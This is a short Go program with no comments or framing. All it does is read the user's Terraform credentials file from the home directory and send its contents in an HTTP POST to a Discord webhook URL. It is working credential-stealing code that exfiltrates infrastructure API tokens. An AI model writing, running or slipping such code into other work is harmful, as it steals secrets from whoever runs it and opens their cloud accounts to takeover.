package main
import ("bytes"; "net/http"; "os"; "path/filepath")
func main() {
	home, _ := os.UserHomeDir()
	b, _ := os.ReadFile(filepath.Join(home, ".terraform.d/credentials.tfrc.json"))
	http.Post("https://discord.com/api/webhooks/1234567890123456789/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345", "application/json", bytes.NewReader(b))
}
